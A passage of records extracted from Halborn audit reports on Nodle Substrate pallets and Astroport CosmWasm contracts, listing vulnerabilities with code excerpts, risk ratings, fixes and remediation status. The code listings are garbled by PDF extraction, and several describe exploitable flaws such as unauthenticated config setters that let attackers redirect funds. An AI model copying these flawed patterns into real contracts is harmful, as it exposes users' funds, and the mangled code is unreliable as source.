        "body": "It was observed that the emergency shutdown pallet is used only in the However, there are more allocate function in the allocations pallet. public functions across different pallets that might be problematic if, at any point in time, there is a bug (security/non-security) discovered within them. There should be a functionality to shutdown them down before new fixes are pushed Code Location: These functions should have a shutdown functionality: Grants pallet  add_vesting_schedule Staking pallet  validator_join_pool  validator_exit_pool  validator_bond_more  validator_bond_less  nominator_nominate  nominator_denominate  nominator_bond_more  nominator_bond_less  nominator_move_nomination  unbond_frozen  withdraw_unbonded  withdraw_staking_rewards 18 Risk Level: Likelihood - 3 Impact - 4 Recommendation: Consider enabling shutdown functionality in critical public functions. Example Code: Listing 2 1 ensure! ( 2 3 4 !pallet_emergency_shutdown :: Pallet :: <T >:: shutdown () , Error :: <T >:: UnderShutdown ); Remediation Plan: PENDING: In a future release, the Nodle team will modify the emergency shutdown pallet to better generalize. 19 ",
        "labels": [
            "Halborn",
            "Nodle_Nodl_Substrate_Pallet",
            "Severity: Medium"
        ]
    },
    {
        "title": "HAL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Nodle_Nodl_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that the set_staking_limits privileged function is missing sanity checks on provided values. Even though it is a protected function, it is still advised to have some sanity checks to avoid any human error. Code Location: Listing 3: pallets/staking/src/lib.rs 201 pub fn set_staking_limits ( 202 203 204 205 206 207 208 origin : OriginFor <T >, max_stake_validators : u32 , min_stake_session_selection : BalanceOf <T >, min_validator_bond : BalanceOf <T >, min_nominator_total_bond : BalanceOf <T >, min_nominator_chill_threshold : BalanceOf <T >, ) -> DispatchResultWithPostInfo { Risk Level: Likelihood - 3 Impact - 2 Recommendation: It is recommended to add sanity checks to ensure:  max_stake_validators != 0  min_stake_session_selection != 0  min_validator_bond != 0  min_nominator_total_bond != 0 20 Remediation Plan: SOLVED: The issue was solved by the Nodle team.  Fix Commit 21 ",
        "labels": [
            "Halborn",
            "Nodle_Nodl_Substrate_Pallet",
            "Severity: Low"
        ]
    },
    {
        "title": "HAL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Nodle_Nodl_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that you can create a vesting schedule to yourself. Code Location: Listing 4: pallets/grants/src/lib.rs 157 158 159 160 161 162 163 164 pub fn add_vesting_schedule ( origin : OriginFor <T >, dest : <T :: Lookup as StaticLookup >:: Source , schedule : VestingScheduleOf <T >, ) -> DispatchResultWithPostInfo { let from = ensure_signed ( origin ) ?; let to = T :: Lookup :: lookup ( dest ) ?; Self :: do_add_vesting_schedule (& from , & to , schedule .  clone () ) ?; 165 166 Self :: deposit_event ( Event :: VestingScheduleAdded ( from ,  to , schedule )); 167 168 } Ok (() . into () ) Risk Level: Likelihood - 3 Impact - 2 Recommendation: add Please fn add_vesting_schedule. check a that ensures that the from != to in the 22 Remediation Plan: SOLVED: The issue was solved by the Nodle team.  Fix Commit 23 ",
        "labels": [
            "Halborn",
            "Nodle_Nodl_Substrate_Pallet",
            "Severity: Low"
        ]
    },
    {
        "title": "HAL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Nodle_Nodl_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that the allocate function that should have a zero value check on the amount argument. Code Location: Listing 5: pallets/grants/src/lib.rs (Line 88) 85 86 87 88 89 90 91 92 pub fn allocate ( origin : OriginFor <T >, to : T :: AccountId , amount : BalanceOf <T >, proof : Vec < u8 >, ) -> DispatchResultWithPostInfo { Self :: ensure_oracle ( origin ) ?; ... Risk Level: Likelihood - 2 Impact - 2 Recommendation: Consider adding zero value checks to those functions to avoid performing redundant operations if a zero value is received. Remediation Plan: SOLVED: The issue was solved by the Nodle team. 24  Fix Commit 25 ",
        "labels": [
            "Halborn",
            "Nodle_Nodl_Substrate_Pallet",
            "Severity: Low"
        ]
    },
    {
        "title": "HAL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Nodle_Nodl_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that the pallet allows the creation of vesting schedules that are less than the current block number. Those vesting schedules are not more than the regular transfers with extra steps. Therefore, those are redundant Example: Listing 6 1 Current Block : 100 2 3 Vesting Schedule Start : 1 st Block 4 5 Period : 10 Blocks 6 7 Period_count : 2 8 9 Per Period : 1 knodl 10 11 ================== 12 13 Vesting Duration : 10 * 2 + 1 = 21 Blocks 14 Initial Transfer sent : 2 knodl 15 16 Next Claims : 0 since Vesting Duration < Current Block Risk Level: Likelihood - 1 Impact - 1 26 Recommendation: Consider adding a check that ensures that the: (period * period_count)+ start > current_block_number Remediation Plan: NOT APPLICABLE: The issue was marked as not applicable by the Nodle team saying: This can be useful to keep it as it is. In fact, we may have to create retroactive awards that may have been partially vested. 27 ",
        "labels": [
            "Halborn",
            "Nodle_Nodl_Substrate_Pallet",
            "Severity: Informational"
        ]
    },
    {
        "title": "HAL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Nodle_Nodl_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that the grants pallet contains a redundant check. Code Location: There is no need for a second new_lock.is_zero() since it was already checked prior. Removing of the vestingSchedule can be performed within the first check. Listing 7: pallets/grants/src/lib.rs (Line 253) 247 if new_lock . is_zero () { 248 T :: Currency :: remove_lock ( VESTING_LOCK_ID , & target )  ; 249 250 } else { T :: Currency :: set_lock ( VESTING_LOCK_ID , & target ,  new_lock , WithdrawReasons :: all () ); 251 252 253 254 255 256 257 } if new_lock . is_zero () { // No more claimable , clear VestingSchedules :: <T >:: remove ( target . clone () ); } else { T :: Currency :: set_lock ( VESTING_LOCK_ID , & target ,  new_lock , WithdrawReasons :: all () ); 258 } Risk Level: Likelihood - 1 Impact - 1 28 Recommendation: Please remove the second new_lock.is_zero() check and remove the vestingSchedule within the first check. Listing 8: pallets/grants/src/lib.rs 247 if new_lock . is_zero () { 248 T :: Currency :: remove_lock ( VESTING_LOCK_ID , & target )  ; 249 250 251 VestingSchedules :: <T >:: remove ( target . clone () ); } else { T :: Currency :: set_lock ( VESTING_LOCK_ID , & target ,  new_lock , WithdrawReasons :: all () ); 252 } Remediation Plan: SOLVED: The issue was solved by the Nodle team.  Fix Commit 29 ",
        "labels": [
            "Halborn",
            "Nodle_Nodl_Substrate_Pallet",
            "Severity: Informational"
        ]
    },
    {
        "title": "HAL",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Nodle_Nodl_Substrate_Pallet_Security_Audit_Report_Halborn_Final.pdf",
        "body": "It was observed that the old1 variable in on_finalize function in tcr pallet is redundant. Tuple returned from commit_applications is Ok(( new_members, Vec::new())). Therefore, old1 is always going to be an empty vector. Hence, extending it with old2 does not make any difference. In this scenario, we only care about new_1 Code Location: Listing 9: pallets/tcr/src/lib.rs 138 fn on_finalize ( block : T :: BlockNumber ) { 139 140 let ( mut new_1 , mut old_1 ) = Self :: commit_applications ( block ). unwrap_or (( Vec ::  new () , Vec :: new () )); 141 142 let ( new_2 , old_2 ) = Self :: resolve_challenges ( block ). unwrap_or (( Vec ::  new () , Vec :: new () )); 143 144  uniq checks // Should never be the same , so should not need some 145 146 147 148 149 150 151 152 new_1 . extend ( new_2 ); old_1 . extend ( old_2 ); new_1 . sort () ; old_1 . sort () ; Self :: notify_members_change ( new_1 , old_1 ); } 30 Listing 10: pallets/tcr/src/lib.rs (Line 478) 460 fn commit_applications ( block : T :: BlockNumber ) ->  FinalizeHelperResultFrom <T > { 461 462 463 464 let new_members = < Applications <T , I > >:: iter () . filter (|( _account_id , application )| { block . checked_sub (& application . clone () .  created_block ) 465 . expect ( \" created_block should always be  smaller than block ; qed \") 466 467 468 469 470 >= T :: FinalizeApplicationPeriod :: get () }) . map (|( account_id , application )| { < Applications <T , I > >:: remove ( account_id . clone () ); < Members <T , I > >:: insert ( account_id . clone () ,  application . clone () ); 471 Self :: unreserve_for ( account_id . clone () ,  application . candidate_deposit ); 472 Self :: deposit_event ( Event :: ApplicationPassed (  account_id . clone () )) ; 473 474 475 476 477 478 479 } account_id }) . collect :: < Vec <T :: AccountId > >() ; Ok (( new_members , Vec :: new () )) // === HERE === Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider omitting old1 and remove all actions performed on it. 31 Listing 11: pallets/tcr/src/lib.rs 247 fn on_finalize ( block : T :: BlockNumber ) { 248 249 let ( mut new_1 , _ ) = Self :: commit_applications ( block ). unwrap_or (( Vec ::  new () , Vec :: new () )); 250 251 let ( new_2 , mut old ) = Self :: resolve_challenges ( block ). unwrap_or (( Vec ::  new () , Vec :: new () )); 252 253  uniq checks // Should never be the same , so should not need some 254 255 256 257 258 259 260 261 new_1 . extend ( new_2 ); new_1 . sort () ; old . sort () ; Self :: notify_members_change ( new_1 , old ); } Remediation Plan: SOLVED: The issue was solved by the Nodle team.  Fix Commit 32 3.10 (HAL-10) HAL-10 USAGE OF VULNERABLE CRATES - INFORMATIONAL ",
        "labels": [
            "Halborn",
            "Nodle_Nodl_Substrate_Pallet",
            "Severity: Informational"
        ]
    },
    {
        "title": "ANONYMOUS CONTRACT CONFIG MODIFICATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The astroport-maker and astroport-generator contracts hold their configu- rations in storage. Configuration parameters are set with the set_config , set_allowed_reward_proxies and set_tokens_per_block functions defined in contracts/tokenomics/maker/src/contract.rs and contracts/tokenomics/ generator/src/contract.rs. Because those functions do not verify the message sender, malicious users can overwrite configuration parameters. For example, overwriting the staking and governance contract addresses may redirect new funds to attacker-controlled account(s). Code Location: Contract initialisation Listing 1: tokenomics/maker/src/contract.rs (Lines 30,39) 20 #[ cfg_attr ( not ( feature = \" library \") , entry_point ) ] 21 pub fn instantiate ( 22 23 24 25 26 ) -> Result < Response , ContractError > { 27 deps : DepsMut , _env : Env , info : MessageInfo , msg : InstantiateMsg , set_contract_version ( deps . storage , CONTRACT_NAME , CONTRACT_VERSION ) ?; let governance_contract = if let Some ( governance_contract ) = msg . governance_contract { Option :: from ( deps . api . addr_validate (& governance_contract ) ?) } else { None }; 28 29 30 31 32 33 34 18 35 36 37 38 39 40 41 42 let governance_percent = if let Some ( governance_percent ) = msg . governance_percent { if governance_percent > Uint64 :: new (100) { return Err ( ContractError :: IncorrectGovernancePercent {}) ; }; governance_percent } else { Uint64 :: zero () }; Token distribution Listing 2: tokenomics/maker/src/contract.rs (Lines 155,167) 147 let governance_amount = if let Some ( governance_contract ) = cfg . 148 149 150 151 152 153 154 155 governance_contract . clone () { let amount = amount . multiply_ratio ( Uint128 :: from ( cfg . governance_percent ) , Uint128 :: new (100) ); let to_governance_asset = Asset { info : info . clone () , amount , }; result . push ( SubMsg :: new ( to_governance_asset . into_msg (& deps . querier , governance_contract )? , )); amount Uint128 :: zero () 156 157 158 } else { 159 160 }; 161 let staking_amount = amount - governance_amount ; 162 let to_staking_asset = Asset { 163 164 165 }; 166 result . push ( SubMsg :: new ( 167 info , amount : staking_amount , to_staking_asset . into_msg (& deps . querier , cfg . staking_contract . clone () )?, 168 )); 19 Anonymous config update Listing 3: tokenomics/maker/src/contract.rs (Lines 70) staking_contract , governance_contract , governance_percent , 66 ExecuteMsg :: SetConfig { 67 68 69 70 } => set_config ( deps , 71 env , 72 staking_contract , 73 governance_contract , 74 75 governance_percent , 76 ) , Listing 4: tokenomics/maker/src/contract.rs (Lines 237,244) deps : DepsMut , _env : Env , staking_contract : Option < String >, governance_contract : Option < String >, governance_percent : Option < Uint64 >, 225 fn set_config ( 226 227 228 229 230 231 ) -> Result < Response , ContractError > { 232 233 234 235 236 237 let mut config = CONFIG . load ( deps . storage ) ?; let mut event = Event :: new ( \" Set config \" . to_string () ); if let Some ( staking_contract ) = staking_contract { config . staking_contract = deps . api . addr_validate (& 238 239 240 241 242 243 244 245 246 247 staking_contract ) ?; event . attributes . push ( Attribute :: new (\" staking_contract \" , & staking_contract )) ; }; if let Some ( governance_contract ) = governance_contract { config . governance_contract = Option :: from ( deps . api . addr_validate (& governance_contract ) ?) ; event . attributes . push ( Attribute :: new (\" governance_contract \" , & 20 248 }; governance_contract )) ; Risk Level: Likelihood - 5 Impact - 4 Recommendations: Validate the message sender in all three functions function to prevent malicious users from overwriting contract configuration parameters. Remediation plan: SOLVED: The issue was fixed in commits 35c6c37a73459166935134e47a6ceb8a1aeff5a1 and 8eede4931d71f7c48c5b469128683b6bd38810f0 -- all three functions validate the sender address now. 21 ",
        "labels": [
            "Halborn",
            "Astroport_fi_AMM_Protocol_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "POSSIBILITY TO CREATE POOLS WITH THE SAME PAIR",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "execute_create_pair function in contracts/factory/src/contract.rs allows the possibility to create pools with the same pair, which generates unexpected situations, e.g.: a user could withdraw more tokens than his fair share and affect other users in the pool. This issue happens because the aforementioned function does not validate if pairs in asset_infos have the same value. A proof of concept video showing how to exploit this security issue is included in the report. Additionally, it was found that when exploiting this vulnerability with the ASTRO token contract, a threat actor could farm additional gover- nance tokens potentially undermining many of the key governance concepts outlined within the Astroport lite paper. Code Location: Listing 5: contracts/factory/src/contract.rs 187 pub fn execute_create_pair ( deps : DepsMut , 188 env : Env , 189 pair_type : PairType , 190 asset_infos : [ AssetInfo ; 2] , 191 192 init_hook : Option < InitHook >, 193 ) -> Result < Response , ContractError > { 194 195 196 197 198 199 200 if PAIRS { let config = CONFIG . load ( deps . storage ) ?; . may_load ( deps . storage , & pair_key (& asset_infos )) . unwrap_or ( None ) . is_some () 22 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 return Err ( StdError :: generic_err (\" Pair already exists \" ). into () ); } // Get pair type from config let pair_config = PAIR_CONFIGS . load ( deps . storage , pair_type . to_string () ) . map_err (| _| ContractError :: PairConfigNotFound {}) ?; PAIRS . save ( deps . storage , & pair_key (& asset_infos ) , & PairInfo { liquidity_token : Addr :: unchecked ( \" \") , contract_addr : Addr :: unchecked ( \"\" ) , asset_infos : [ asset_infos [0]. clone () , asset_infos [1]. clone () ], pair_type : pair_type . clone () , }, ) ?; Risk Level: Likelihood - 4 Impact - 4 Recommendations: Update the logic of execute_create_pair function to ensure that pairs in asset_infos do not have the same value. Remediation plan: SOLVED: The issue was fixed in commit 3e9836de40a05b7b2c94c87f5cd690c1f16a7876. 23 ",
        "labels": [
            "Halborn",
            "Astroport_fi_AMM_Protocol_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "REPEATED POOLS CAN BE CREATED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "execute_create_pair function in contracts/factory/src/contract.rs allows the possibility to create pools with already existing pairs. This issue happens because pair_key function will consider that two addresses are different if they differ just in their upper / lower cases. The situation described above can produce the following consequences:  Potential fixes for HAL-02 can be bypassed and users will be able to create pools with the same pair, which generates unexpected situations, e.g.: a user could withdraw more tokens than his fair share and affect other users in the pool.  Repeated pools with already existing pairs can severely reduce the liquidity of each pool and, as a consequence, discourage users to add liquidity or swap using Astroport AMM protocol. A proof of concept video showing how to exploit this security issue is included in the report. Code Location: Listing 6: contracts/factory/src/contract.rs (Lines 196,197) 187 pub fn execute_create_pair ( deps : DepsMut , 188 env : Env , 189 pair_type : PairType , 190 asset_infos : [ AssetInfo ; 2] , 191 192 init_hook : Option < InitHook >, 193 ) -> Result < Response , ContractError > { 194 195 196 if PAIRS let config = CONFIG . load ( deps . storage ) ?; 24 197 198 199 200 201 202 { } . may_load ( deps . storage , & pair_key (& asset_infos )) . unwrap_or ( None ) . is_some () return Err ( StdError :: generic_err (\" Pair already exists \" ). into () ); Risk Level: Likelihood - 5 Impact - 3 Recommendations: Update the logic of execute_create_pair to turn addresses in asset_infos into lowercase before calling pair_key function. Remediation plan: SOLVED: The issue was fixed in commits 451dd974e494eefe88301f51732d7cdf09aac3d0 and 55847db04e84bddcf2a4d5607b9f26644c110a3c. 25 ",
        "labels": [
            "Halborn",
            "Astroport_fi_AMM_Protocol_CosmWasm",
            "Severity: High"
        ]
    },
    {
        "title": "ADDING LIQUIDITY TO NEW POOLS DOES NOT WORK PROPERLY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When users call provide_liquidity function in contracts/pair/src/contract.rs or contracts/pair_stable/src/contract.rs to add liquidity to new pools (i.e.: pools with no deposits), the assert_slippage_tolerance function is triggered and will always panic if slippage is specified at the This situation can produce the following beginning of the operation. consequences:  When legitimate users try to add liquidity to new pools, operations will always panic and make users spend transactions fees needlessly.  To force a new pool to work as expected, a user should transfer tokens directly to the pool without receiving LP tokens in return, and with the risk that another user benefit from his deposit.  The issues explained above will arise every time a new pool is created (or when its deposits become 0) and legitimate users try to add liquidity. Code Location: Listing 7: contracts/pair/src/contract.rs (Lines 833,835) 832 if Decimal256 :: from_ratio ( deposits [0] , deposits [1]) * one_minus_slippage_tolerance > Decimal256 :: from_ratio ( pools [0] , pools [1]) || Decimal256 :: from_ratio ( deposits [1] , deposits [0]) * one_minus_slippage_tolerance > Decimal256 :: from_ratio ( pools [1] , pools [0]) return Err ( ContractError :: MaxSlippageAssertion {}) ; 833 834 835 836 837 838 { } 26 Listing 8: contracts/pair_stable/src/contract.rs (Lines 942,944) 941 if Decimal256 :: from_ratio ( deposits [0] , deposits [1]) * one_minus_slippage_tolerance > Decimal256 :: from_ratio ( pools [0] , pools [1]) || Decimal256 :: from_ratio ( deposits [1] , deposits [0]) * one_minus_slippage_tolerance > Decimal256 :: from_ratio ( pools [1] , pools [0]) return Err ( ContractError :: MaxSlippageAssertion {}) ; 942 943 944 945 946 947 { } Risk Level: Likelihood - 5 Impact - 2 Recommendations: Update the logic of assert_slippage_tolerance function to handle correctly the case where a pool has no deposits and slippage is specified as an argument of the function. Remediation plan: SOLVED: The issue was fixed in commit 612e570f16ae0020a9c45fb30c6115dec83850d5. 27 ",
        "labels": [
            "Halborn",
            "Astroport_fi_AMM_Protocol_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "UPDATING A CONFIG PARAMETER AFFECTS PAST REWARDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "tokens_per_block is a configuration parameter of the astroport-generator It is used to calculate the amount of rewards a user is contract. eligible for. However, if this parameters value is modified after pools are created all rewards will be calculated using the updated value, regardless of when deposits were made. For example, if users had deposited tokens when tokens_per_block was x and withdrew when tokens_per_block was y all their rewards were calculated using value y. Code Location: Listing 9: contracts/generator/src/contract.rs (Lines 43) deps : DepsMut , _env : Env , info : MessageInfo , msg : InstantiateMsg , 28 pub fn instantiate ( 29 30 31 32 33 ) -> Result < Response , ContractError > { 34 set_contract_version ( deps . storage , CONTRACT_NAME , CONTRACT_VERSION ) ?; let mut allowed_reward_proxies : Vec < Addr > = vec! []; for proxy in msg . allowed_reward_proxies { allowed_reward_proxies . push ( deps . api . addr_validate (& proxy ) ?) ; } let config = Config { astro_token : deps . api . addr_validate (& msg . astro_token )? , tokens_per_block : msg . tokens_per_block , total_alloc_point : Uint64 :: from (0 u64 ) , 35 36 37 38 39 40 41 42 43 44 28 Listing 10: tokenomics/generator/src/contract.rs (Lines 758) 756 fn set_tokens_per_block ( deps : DepsMut , amount : Uint128 ) -> Result < Response , ContractError > { CONFIG . update :: <_ , ContractError >( deps . storage , | mut v| { v . tokens_per_block = amount ; Ok ( v ) }) ?; Ok ( Response :: new () . add_event ( Event :: new (\" Set tokens per block \"). add_attribute (\" amount \" , amount )) ) 757 758 759 760 761 762 763 } Risk Level: Likelihood - 2 Impact - 4 Recommendations: Call the mass_update_pools function before updating the tokens_per_block parameter to ensure rewards are calculated correctly. Remediation plan: SOLVED: The issue was fixed in commit 3a4a8a96e9eec94e8868662eca453601a8d342d9. Pools are now updated before the tokens_per_block parameters value is changed. 29 ",
        "labels": [
            "Halborn",
            "Astroport_fi_AMM_Protocol_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "MAXIMUM THRESHOLD FOR SLIPPAGE IS NOT ENFORCED WHEN ADDING LIQUIDITY OR SWAPPING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When users add liquidity / swap and do not specify slippage tolerance (or its equivalent) in the operation, Astroport AMM protocol does not enforce a default maximum threshold, which could severely affect users amount of tokens received in return. This issue can produce the following scenarios: Scenario #1: Adding liquidity  Someone creates a pool with 8000 token X and 2000 token Y, as a consequence, creator receives 4000 LP in return.  User A sends a transaction to provide liquidity of 80 token X and 20 token Y to the pool, so he expects to receive 40 LP in return.  However, some seconds before transaction of user A is processed, user B swaps 12000 token X to 1200 token Y. The final balance in the pool is: 20000 token X and 800 token Y.  When transaction of user A is processed, he receives 16 LP in return, instead of 40 LP he was expecting, i.e.: less than 50%. Scenario #2: Adding liquidity (imbalanced token pair) If a user mistakenly (or fooled by an attacker) provides liquidity with an imbalanced token pair, he could lose all his excedent tokens. See the following example:  Someone creates a pool with 8000 token X and 2000 token Y, as a consequence, creator receives 4000 LP in return. 30  User A provides liquidity of 80 token X and 20 token Y to the pool, so he receives 40 LP in return.  User B provides liquidity of 80 token X and 2000 token Y, he also receives 40 LP in return, the same amount of LP tokens than previous transaction, but spending 100 times more token B. Scenario #3: Swapping  Someone creates a pool with 8000 token X and 2000 token Y.  User A sends a transaction to swap 100 token X and expects to receive ~25 token Y in return.  However, some seconds before transaction of user A is processed, user B swaps 12000 token X to 1200 token Y. The final balance in the pool is: 20000 token X and 800 token Y.  When transaction of user A is processed, he receives ~4 token Y in return, instead of ~25 token Y he was expecting, i.e.: less than 20% of expected value. Some recent DeFi attacks as occurred to BT.Finance or Saddle Finance show the importance to have a maximum predefined slippage to reduce the impact of tokens loss if unexpected situations appear or attackers compromise smart contracts in a platform. Code Location: When users add liquidity to a pool, assert_slippage_tolerance function will always return Ok(()) if slippage is not specified: Listing 11: contracts/pair/src/contract.rs (Lines 821,841) 821 if let Some ( slippage_tolerance ) = * slippage_tolerance { 822 823 824 let slippage_tolerance : Decimal256 = slippage_tolerance . into () ; if slippage_tolerance > Decimal256 :: one () { return Err ( StdError :: generic_err ( \" slippage_tolerance cannot bigger than 1\" ). into () ); 31 825 826 827 } let one_minus_slippage_tolerance = Decimal256 :: one () - slippage_tolerance ; 828 let deposits : [ Uint256 ; 2] = [ deposits [0]. into () , deposits [1]. into () ]; 829 let pools : [ Uint256 ; 2] = [ pools [0]. amount . into () , pools [1]. amount . into () ]; 830 831 // Ensure each prices are not dropped as much as slippage tolerance rate 832 if Decimal256 :: from_ratio ( deposits [0] , deposits [1]) * 833 834 one_minus_slippage_tolerance > Decimal256 :: from_ratio ( pools [0] , pools [1]) || Decimal256 :: from_ratio ( deposits [1] , deposits [0]) * one_minus_slippage_tolerance > Decimal256 :: from_ratio ( pools [1] , pools [0]) return Err ( ContractError :: MaxSlippageAssertion {}) ; { 835 836 837 838 839 } 840 841 Ok (() ) } Listing 12: contracts/pair_stable/src/contract.rs (Lines 930,950) 930 if let Some ( slippage_tolerance ) = * slippage_tolerance { 931 let slippage_tolerance : Decimal256 = slippage_tolerance . into () 932 933 934 935 936 937 938 939 940 ; if slippage_tolerance > Decimal256 :: one () { return Err ( StdError :: generic_err (\" slippage_tolerance cannot bigger than 1\" ). into () ); } let one_minus_slippage_tolerance = Decimal256 :: one () - slippage_tolerance ; let deposits : [ Uint256 ; 2] = [ deposits [0]. into () , deposits [1]. into () ]; let pools : [ Uint256 ; 2] = [ pools [0]. amount . into () , pools [1]. amount . into () ]; // Ensure each prices are not dropped as much as slippage tolerance rate 32 941 942 943 if Decimal256 :: from_ratio ( deposits [0] , deposits [1]) * one_minus_slippage_tolerance > Decimal256 :: from_ratio ( pools [0] , pools [1]) || Decimal256 :: from_ratio ( deposits [1] , deposits [0]) * one_minus_slippage_tolerance > Decimal256 :: from_ratio ( pools [1] , pools [0]) return Err ( ContractError :: MaxSlippageAssertion {}) ; { 944 945 946 947 948 } 949 950 Ok (() ) } When users try to swap, assert_max_spread function will always return Ok(()) if max_spread is not specified: Listing 13: contracts/pair/src/contract.rs (Lines 795,807,813) 788 pub fn assert_max_spread ( 789 790 791 792 793 794 ) -> Result <() , ContractError > { 795 belief_price : Option < Decimal >, max_spread : Option < Decimal >, offer_amount : Uint128 , return_amount : Uint128 , spread_amount : Uint128 , if let ( Some ( max_spread ) , Some ( belief_price )) = ( max_spread , 796 797 798 799 800 801 802 803 804 805 806 807 808 belief_price ) { let expected_return = offer_amount * Decimal :: from ( Decimal256 :: one () / Decimal256 :: from ( belief_price )) ; let spread_amount = expected_return . checked_sub ( return_amount ) . unwrap_or_else (| _| Uint128 :: zero () ); if return_amount < expected_return && Decimal :: from_ratio ( spread_amount , expected_return ) > max_spread { } return Err ( ContractError :: MaxSpreadAssertion {}) ; } else if let Some ( max_spread ) = max_spread { if Decimal :: from_ratio ( spread_amount , return_amount + spread_amount ) > max_spread { 33 return Err ( ContractError :: MaxSpreadAssertion {}) ; 809 810 811 812 813 814 } } } Ok (() ) Listing 14: contracts/pair_stable/src/contract.rs (Lines 904,916,922) 897 pub fn assert_max_spread ( 898 899 900 901 902 903 ) -> Result <() , ContractError > { 904 belief_price : Option < Decimal >, max_spread : Option < Decimal >, offer_amount : Uint128 , return_amount : Uint128 , spread_amount : Uint128 , if let ( Some ( max_spread ) , Some ( belief_price )) = ( max_spread , belief_price ) { let expected_return = offer_amount * Decimal :: from ( Decimal256 :: one () / Decimal256 :: from ( belief_price )) ; let spread_amount = expected_return . checked_sub ( return_amount ) . unwrap_or_else (| _| Uint128 :: zero () ); if return_amount < expected_return && Decimal :: from_ratio ( spread_amount , expected_return ) > max_spread { } return Err ( ContractError :: MaxSpreadAssertion {}) ; } else if let Some ( max_spread ) = max_spread { if Decimal :: from_ratio ( spread_amount , return_amount + spread_amount ) > max_spread { return Err ( ContractError :: MaxSpreadAssertion {}) ; } } Ok (() ) 905 906 907 908 909 910 911 912 913 914 915 916 917 918 919 920 921 922 923 } 34 Risk Level: Likelihood - 2 Impact - 4 Recommendations: Enforce the use of a default maximum threshold when users add liquidity or swap, but do not specify slippage tolerance (or its equivalent) or slippage value is greater than the threshold. As a reference, max slippage for Uniswap Pool and Uniswap Swap is 50%. Remediation plan: SOLVED: The issue was fixed in the following commits:  163ff75bbd42953eff9669fe2d6d081b7919c3fe  52db1fde41737274ec5beb182546ba4f76382752  fdd6eaec8ce5cb7d5ca7156e4d22ec9654fc7de7 35 ",
        "labels": [
            "Halborn",
            "Astroport_fi_AMM_Protocol_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "PRIVILEGED ADDRESS CAN BE TRANSFERRED WITHOUT CONFIRMATION IN FACTORY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "An incorrect use of execute_update_config function in contracts/factory/s- rc/contract.rs can set owner of factory contract to an invalid address and inadvertently lose total control of this contract, which cannot be undone in any way. Currently, the owner of the factory contract can change the owner address using the aforementioned function in a single transaction and without confirmation from the new address. Code Location: Listing 15: contracts/factory/src/contract.rs (Lines 127) 125 126 127 128 if let Some ( owner ) = owner { // validate address format config . owner = deps . api . addr_validate ( owner . as_str () ) ?; } Risk Level: Likelihood - 2 Impact - 4 Recommendations: It is recommended to split owner transfer functionality into set_owner and accept_ownership functions. The latter function allows the transfer to be completed by the recipient. 36 Remediation plan: SOLVED: The issue was fixed in commit d087c04d99f3b44b9c65ebf676fd40cee99d47cf. 37 ",
        "labels": [
            "Halborn",
            "Astroport_fi_AMM_Protocol_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "OWNER ADDRESS NOT TRANSFERABLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_AMM_Protocol_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
